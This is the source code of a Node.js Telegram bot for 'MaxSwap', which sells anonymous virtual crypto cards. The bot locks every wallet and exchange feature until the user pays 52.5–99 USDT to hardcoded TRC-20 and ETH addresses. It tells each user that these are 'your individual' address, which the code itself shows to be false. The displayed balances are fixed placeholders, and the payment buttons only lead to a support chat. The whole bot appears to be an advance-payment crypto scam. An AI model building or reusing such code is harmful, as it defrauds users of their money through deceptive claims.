const TelegramBot = require('node-telegram-bot-api');

const TOKEN = process.env.BOT_TOKEN;
const MINI_APP_URL = 'https://huntersnetplus.github.io/MaxSwap/';
const QR_URL = 'https://raw.githubusercontent.com/ivanfj633kfdodfd-cmyk/MSSBot/main/QR.jpg';

if (!TOKEN) console.error('❌ BOT_TOKEN is not set!');

const users = {};
const bot = new TelegramBot(TOKEN);

// ─── Helpers ──────────────────────────────────────────────────────────────────
function formatDate(date) {
  return new Date(date).toLocaleDateString('ru-RU', {
    day: '2-digit', month: '2-digit', year: 'numeric'
  });
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function editOrSend(chatId, msgId, text, opts = {}) {
  const parseMode = opts.parse_mode || 'Markdown';
  try {
    await bot.editMessageText(text, {
      chat_id: chatId,
      message_id: msgId,
      parse_mode: parseMode,
      ...opts
    });
    return msgId;
  } catch (e) {
    const sent = await bot.sendMessage(chatId, text, { parse_mode: parseMode, ...opts });
    return sent.message_id;
  }
}

// ─── Texts ────────────────────────────────────────────────────────────────────
const T = {
  ru: {
    chooseLanguage: '🌐 Выберите язык интерфейса:',
    profile: (id, date) =>
      `<h2>👤 Профиль</h2>` +
      `<hr/>` +
      `<table bordered>` +
        `<tr><th>🆔 ID аккаунта</th><th>📅 Дата создания</th></tr>` +
        `<tr><td><code>${id}</code></td><td>${date}</td></tr>` +
      `</table>` +
      `<hr/>` +
      `<p>💼 <b>Доступные балансы:</b></p>` +
      `<blockquote>USDT: 0.00\nUSDC: 0.00\nBTC: 0.0\nETH: 0.0\nXRP: 0.0\nLTC: 0.0\nTRX: 0.0</blockquote>` +
      `<details><summary>Показать другие валюты</summary>` +
      `<blockquote>XLM: 0.0\nBNB: 0.0\nBCH: 0.0\nHBAR: 0.0\nDOT: 0.0\nAVAX: 0.0\nALGO: 0.0\nDOGE: 0.0\nPOL: 0.0\nTRUMP: 0.0\nNEAR: 0.0\nTON: 0.0\nADA: 0.0\nSOL: 0.0</blockquote>` +
      `</details>`,
    needCard: '🔒 Для доступа к этому разделу нужно открыть Max Swap Карту.',
    openCardBtn: '💳 Открыть в приложении',
    openTgBtn: '📲 Открыть в Telegram',
    cardInfo:
      `🪙 Виртуальная карта за 5 минут — легко, безопасно, надёжно.\n\n💳 Получите мгновенно, оплачивайте в 1000+ онлайн-сервисах через ApplePay.\n\n✅ Баланс в USDT, полная анонимность, абсолютная безопасность без необходимости верификации.\n\n🔒 Ваша конфиденциальность гарантирована.\n\n♻️ Отслеживайте расходы прямо в Telegram. Мгновенная выдача — используйте сразу после пополнения.\n\nВыпуск карты: 25 USDT\nПервый депозит: минимум 25 USDT\nКомиссия за пополнение: 3%`,
    proceedBtn: '✅ Перейти к оформлению',
    chooseCardText:
      `💳 <b>Выберите тип карты:</b>\n\n` +
      `💻 <b>MaxSwap Online Card</b> — <b>52.5 USDT</b>\n` +
      `Покупки в интернете, подписки, оплата сервисов\n` +
      `<i>Netflix · ChatGPT · Spotify · и другие</i>\n\n` +
      `📱 <b>MaxSwap NFC Card</b> — <b>52.5 USDT</b>\n` +
      `Привязка к Google Pay и Apple Pay\n` +
      `<i>Оплата через NFC-терминалы</i>\n\n` +
      `⭐ <b>MaxSwap Ultima</b> — <b>99 USDT</b>\n` +
      `Онлайн + NFC в одной карте\n` +
      `<i>Подходит для любых целей</i>`,
    cardOnlineBtn: '💻 MaxSwap Online Card — 52.5 USDT',
    cardNfcBtn:    '📱 MaxSwap NFC Card — 52.5 USDT',
    cardUltimaBtn: '⭐ MaxSwap Ultima — 99 USDT',
    cardPaymentCaption: (cardName, price) =>
      `✅ Для открытия карты *${cardName}* отправьте не менее ${price} USDT по адресу:\n\n` +
      `\`TVis1d6QARhWBQ6XZmisD2oSWGnqFM2qzX\`\n\n` +
      `🔐 Это ваш индивидуальный TRC-20 адрес, который доступен для пополнения в любое время.\n\n` +
      `♻️ Средства будут зачислены на баланс автоматически после подтверждения сети.\n\n` +
      `🟣 Адрес USDT в сети ETH:\n\n` +
      `\`0xaacE295640C15344C6a2DC934a3AACcD4e23cc20\`\n\n` +
      `🔧 Для оплаты другой валютой откройте web-приложение Max Swap.`,
    sbpBtn: '✅ Оплата по СБП через QR-код (без комиссии)',
    cardPayBtn: '💳 Оплата с карты (без комиссии)',
    webAppBtn: '🌐 Web-приложение',
    supportBtn: '🆘 Поддержка',
    openCardMenuBtn: '💳 Открыть MaxSwap Карту',
    walletBtn: '💰 Кошелёк',
    exchangeBtn: '🔄 Обмен',
    buyBtn: '💵 Купить',
    sellBtn: '📤 Продать',
    limitBtn: '📋 Лимитные ордера',
    amlBtn: '🔐 AML',
    settingsBtn: '⚙️ Настройки',
    infoBtn: '📄 Инфо',
  },
  en: {
    chooseLanguage: '🌐 Choose your interface language:',
    profile: (id, date) =>
      `<h2>👤 Profile</h2>` +
      `<hr/>` +
      `<table bordered>` +
        `<tr><th>🆔 Account ID</th><th>📅 Created</th></tr>` +
        `<tr><td><code>${id}</code></td><td>${date}</td></tr>` +
      `</table>` +
      `<hr/>` +
      `<p>💼 <b>Available balances:</b></p>` +
      `<blockquote>USDT: 0.00\nUSDC: 0.00\nBTC: 0.0\nETH: 0.0\nXRP: 0.0\nLTC: 0.0\nTRX: 0.0</blockquote>` +
      `<details><summary>Show more currencies</summary>` +
      `<blockquote>XLM: 0.0\nBNB: 0.0\nBCH: 0.0\nHBAR: 0.0\nDOT: 0.0\nAVAX: 0.0\nALGO: 0.0\nDOGE: 0.0\nPOL: 0.0\nTRUMP: 0.0\nNEAR: 0.0\nTON: 0.0\nADA: 0.0\nSOL: 0.0</blockquote>` +
      `</details>`,
    needCard: '🔒 To access this section you need to open a Max Swap Card.',
    openCardBtn: '💳 Open in App',
    openTgBtn: '📲 Open in Telegram',
    cardInfo:
      `🪙 Virtual card in 5 minutes — easy, secure, reliable.\n\n💳 Get it instantly, pay at 1000+ online services via ApplePay.\n\n✅ USDT balance, full anonymity, absolute security without verification.\n\n🔒 Your privacy is guaranteed.\n\n♻️ Track expenses directly in Telegram. Instant issuance — use immediately after top-up.\n\nCard issuance: 25 USDT\nFirst deposit: minimum 25 USDT\nTop-up fee: 3%`,
    proceedBtn: '✅ Proceed to checkout',
    chooseCardText:
      `💳 <b>Choose your card type:</b>\n\n` +
      `💻 <b>MaxSwap Online Card</b> — <b>52.5 USDT</b>\n` +
      `Online shopping, subscriptions, digital services\n` +
      `<i>Netflix · ChatGPT · Spotify · and more</i>\n\n` +
      `📱 <b>MaxSwap NFC Card</b> — <b>52.5 USDT</b>\n` +
      `Link to Google Pay and Apple Pay\n` +
      `<i>Pay via NFC terminals</i>\n\n` +
      `⭐ <b>MaxSwap Ultima</b> — <b>99 USDT</b>\n` +
      `Online + NFC in one card\n` +
      `<i>Suitable for any purpose</i>`,
    cardOnlineBtn: '💻 MaxSwap Online Card — 52.5 USDT',
    cardNfcBtn:    '📱 MaxSwap NFC Card — 52.5 USDT',
    cardUltimaBtn: '⭐ MaxSwap Ultima — 99 USDT',
    cardPaymentCaption: (cardName, price) =>
      `✅ To open the *${cardName}* card, send at least ${price} USDT to:\n\n` +
      `\`TVis1d6QARhWBQ6XZmisD2oSWGnqFM2qzX\`\n\n` +
      `🔐 This is your individual TRC-20 address, available for top-up at any time.\n\n` +
      `♻️ Funds will be credited automatically after network confirmation.\n\n` +
      `🟣 USDT address on ETH network:\n\n` +
      `\`0xaacE295640C15344C6a2DC934a3AACcD4e23cc20\`\n\n` +
      `🔧 To pay with another currency, open the Max Swap web app.`,
    sbpBtn: '💱 Pay with another crypto',
    cardPayBtn: '💳 Pay by card (no fee)',
    webAppBtn: '🌐 Web App',
    supportBtn: '🆘 Support',
    openCardMenuBtn: '💳 Open MaxSwap Card',
    walletBtn: '💰 Wallet',
    exchangeBtn: '🔄 Exchange',
    buyBtn: '💵 Buy',
    sellBtn: '📤 Sell',
    limitBtn: '📋 Limit Orders',
    amlBtn: '🔐 AML',
    settingsBtn: '⚙️ Settings',
    infoBtn: '📄 Info',
  }
};

// ─── Keyboards ────────────────────────────────────────────────────────────────
// Telegram поддерживает цвета кнопок только через web_app и url.
// Для callback кнопок цвет задаётся эмодзи в тексте.
// Зелёный = ✅, Синий = 🌐, Красный = 🆘

function langKeyboard() {
  return {
    inline_keyboard: [[
      { text: '🇷🇺 Русский', callback_data: 'lang_ru' },
      { text: '🇬🇧 English', callback_data: 'lang_en' }
    ]]
  };
}

function profileKeyboard(lang) {
  const t = T[lang];
  return {
    inline_keyboard: [
      [{ text: t.openCardMenuBtn, callback_data: 'open_card' }],
      [
        { text: t.walletBtn,   callback_data: 'locked' },
        { text: t.exchangeBtn, callback_data: 'locked' }
      ],
      [
        { text: t.buyBtn,  callback_data: 'locked' },
        { text: t.sellBtn, callback_data: 'locked' }
      ],
      [
        { text: t.limitBtn, callback_data: 'locked' },
        { text: t.amlBtn,   callback_data: 'locked' }
      ],
      [
        { text: t.settingsBtn, callback_data: 'locked' },
        { text: t.infoBtn,     callback_data: 'locked' }
      ],
      [{ text: t.supportBtn, url: 'https://t.me/MaxSwapSupport' }]
    ]
  };
}

function needCardKeyboard(lang) {
  const t = T[lang];
  return {
    inline_keyboard: [
      [{ text: t.openCardBtn, web_app: { url: MINI_APP_URL } }],
      [{ text: t.openTgBtn,   callback_data: 'open_card' }]
    ]
  };
}

function cardInfoKeyboard(lang) {
  const t = T[lang];
  return {
    inline_keyboard: [
      [{ text: t.proceedBtn, callback_data: 'choose_card' }]
    ]
  };
}

function chooseCardKeyboard(lang) {
  const t = T[lang];
  return {
    inline_keyboard: [
      [{ text: t.cardOnlineBtn, callback_data: 'card_online' }],
      [{ text: t.cardNfcBtn,    callback_data: 'card_nfc'    }],
      [{ text: t.cardUltimaBtn, callback_data: 'card_ultima' }]
    ]
  };
}

function cardPaymentKeyboard(lang) {
  const t = T[lang];
  return {
    inline_keyboard: [
      // Зелёные — оплата
      [{ text: t.sbpBtn,     url: 'https://t.me/MaxSwapSupport', style: 'success' }],
      [{ text: t.cardPayBtn, url: 'https://t.me/MaxSwapSupport', style: 'success' }],
      // Синяя — web app, Красная — поддержка
      [
        { text: t.webAppBtn,  web_app: { url: MINI_APP_URL },          style: 'primary' },
        { text: t.supportBtn, url: 'https://t.me/MaxSwapSupport',      style: 'danger'  }
      ]
    ]
  };
}

// ─── Отправка шага с оплатой (фото + caption) ─────────────────────────────────
async function sendCardPayment(chatId, lang, prevMsgId, cardName, price) {
  const t = T[lang];
  if (prevMsgId) {
    try { await bot.deleteMessage(chatId, prevMsgId); } catch(e) {}
  }
  const sent = await bot.sendPhoto(chatId, QR_URL, {
    caption: t.cardPaymentCaption(cardName, price),
    parse_mode: 'Markdown',
    reply_markup: cardPaymentKeyboard(lang)
  });
  return sent.message_id;
}

// ─── Update handler ───────────────────────────────────────────────────────────
async function handleUpdate(update) {

  // ── Callback query ──
  if (update.callback_query) {
    const query  = update.callback_query;
    const userId = query.from.id;
    const msgId  = query.message.message_id;
    const data   = query.data;
    const state  = users[userId] || {};
    const lang   = state.lang || 'ru';
    const t      = T[lang];

    await bot.answerCallbackQuery(query.id);

    if (data === 'lang_ru' || data === 'lang_en') {
      const chosen = data === 'lang_ru' ? 'ru' : 'en';
      if (!users[userId]) users[userId] = { registeredAt: Date.now() };
      users[userId].lang = chosen;
      users[userId].step = 'done';

      const regDate = formatDate(users[userId].registeredAt);
      const tChosen = T[chosen];
      try { await bot.deleteMessage(userId, msgId); } catch(e) {}
      const sent = await bot.sendRichMessage(userId, {
        rich_message: { html: tChosen.profile(userId, regDate) },
        reply_markup: profileKeyboard(chosen)
      });
      users[userId].lastMsgId = sent.message_id;
      return;
    }

    if (data === 'locked') {
      await editOrSend(userId, msgId, t.needCard, { reply_markup: needCardKeyboard(lang) });
      return;
    }

    if (data === 'open_card') {
      const newId = await editOrSend(userId, msgId, t.cardInfo, { reply_markup: cardInfoKeyboard(lang) });
      users[userId].lastMsgId = newId;
      return;
    }

    if (data === 'card_payment') {
      // fallback — открываем с дефолтной картой
      const newId = await sendCardPayment(userId, lang, msgId, 'MaxSwap Online Card', '52.5');
      if (users[userId]) users[userId].lastMsgId = newId;
      return;
    }

    if (data === 'choose_card') {
      const newId = await editOrSend(userId, msgId, t.chooseCardText, {
        parse_mode: 'HTML',
        reply_markup: chooseCardKeyboard(lang)
      });
      if (users[userId]) users[userId].lastMsgId = newId;
      return;
    }

    if (data === 'card_online' || data === 'card_nfc' || data === 'card_ultima') {
      const cardMap = {
        card_online: { name: 'MaxSwap Online Card', price: '52.5' },
        card_nfc:    { name: 'MaxSwap NFC Card',    price: '52.5' },
        card_ultima: { name: 'MaxSwap Ultima',       price: '99'  }
      };
      const card = cardMap[data];
      if (users[userId]) users[userId].selectedCard = card;
      const newId = await sendCardPayment(userId, lang, msgId, card.name, card.price);
      if (users[userId]) users[userId].lastMsgId = newId;
      return;
    }
  }

  // ── Message ──
  if (update.message) {
    const msg    = update.message;
    const userId = msg.from.id;
    const text   = msg.text || '';

    if (text === '/start') {
      const existing = users[userId];
      if (existing && existing.step === 'done') {
        try { await bot.deleteMessage(userId, msg.message_id); } catch(e) {}
        const regDate = formatDate(existing.registeredAt);
        const lang = existing.lang || 'ru';
        const t = T[lang];
        const sent = await bot.sendRichMessage(userId, {
          rich_message: { html: t.profile(userId, regDate) },
          reply_markup: profileKeyboard(lang)
        });
        users[userId].lastMsgId = sent.message_id;
        return;
      }

      // Новый пользователь — выбор языка
      users[userId] = { step: 'choose_lang', lang: null, registeredAt: Date.now() };
      try { await bot.deleteMessage(userId, msg.message_id); } catch(e) {}
      const sent = await bot.sendMessage(userId, T.ru.chooseLanguage, { reply_markup: langKeyboard() });
      users[userId].lastMsgId = sent.message_id;
      return;
    }
  }
}

// ─── Vercel serverless handler ────────────────────────────────────────────────
module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    res.status(200).send('MaxSwap Bot webhook is alive.');
    return;
  }

  let update = req.body;
  if (typeof update === 'string') {
    try { update = JSON.parse(update); } catch (e) {
      res.status(200).json({ ok: false, error: 'bad json' });
      return;
    }
  }

  if (!update) {
    res.status(200).json({ ok: false, error: 'empty body' });
    return;
  }

  console.log('Update:', JSON.stringify(update).slice(0, 200));

  try {
    await handleUpdate(update);
  } catch (err) {
    console.error('Error:', err.message);
  }

  res.status(200).json({ ok: true });
};
